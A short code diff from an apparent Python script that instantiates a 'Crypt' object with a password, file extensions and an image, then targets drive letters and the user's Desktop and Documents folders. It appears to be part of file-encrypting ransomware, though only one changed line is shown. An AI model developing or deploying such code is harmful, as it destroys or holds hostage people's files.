@@ -341,7 +341,7 @@ for letter in list(ascii_uppercase):
 
 # Instantiate the Crypt class
 
-crypto = Crypt(passwd, exts, 'Rain', 'jenna.jpg')
+crypto = Crypt(passwd, exts, 'Rain', img)
 
 desktop = expanduser('~/Desktop')
 documents = expanduser('~/Documents')
